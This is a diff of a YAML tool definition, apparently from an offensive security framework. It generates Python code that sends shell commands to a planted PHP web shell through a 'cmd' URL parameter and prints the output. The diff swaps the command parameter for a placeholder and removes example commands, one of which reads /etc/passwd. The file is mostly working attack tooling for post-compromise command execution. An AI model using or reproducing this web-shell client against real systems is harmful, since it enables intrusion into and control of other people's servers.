@@ -52,7 +52,7 @@ functions:
         print(response)
 
   get_php_webshell_dysco_initial_access_exploit:
-    description: Generate Python Code for a Dysco Webshell Initial Access Exploit
+    description: Generate Python Code for a Dysco Webshell Initial Access Payload
     parameters:
       target_url:
         type: string
@@ -60,28 +60,12 @@ functions:
         description: The URL to the web shell
         examples:
           - 'http://127.0.0.1/shell.php'
-          - 'https://localhost/uploads/evilshell'
-      command:
-        type: string
-        required: true
-        description: The command to run on the system hosting the webshell
-        examples:
-          - 'whoami'
-          - 'cat /etc/passwd | grep root'
-          - 'ipconfig /all'
-    container:
-      force: true
-      preserve_app: true
-      image: python:3.7-alpine
-      args:
-        - --net=host
-      volumes:
-
+          - 'https://target_host/uploads/webshell'
     cmdline:
       - echo
       - |
         from urllib import (parse, request);
         url="${target_url}"
-        cmd="${command}"
+        cmd="<command>"
         response=request.urlopen(f"{url}?cmd={parse.quote(cmd)}").read().decode().split('<br/>')[3]
         print(response)
